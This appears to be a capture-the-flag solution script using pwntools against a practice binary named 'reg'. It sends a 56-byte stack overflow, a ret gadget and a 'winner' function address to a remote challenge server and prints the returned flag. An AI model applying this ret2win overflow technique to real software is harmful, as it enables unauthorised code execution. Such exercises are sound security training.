from pwn import *

context.log_level = 'critical'
context.binary = binary = ELF('./reg')
rop = ROP(binary)

address = '94.237.63.109'
port = 44161

overflow = b'A' * 56
winner_addr = p64(binary.symbols.winner)
ret_gadget_addr = p64(rop.find_gadget(['ret'])[0])

payload = overflow
payload += ret_gadget_addr
payload += winner_addr

with remote(address, port) as target:
	target.sendline(payload)
	target.recvuntil(b'Congratulations!\n')
	print(target.recvline().decode().strip())
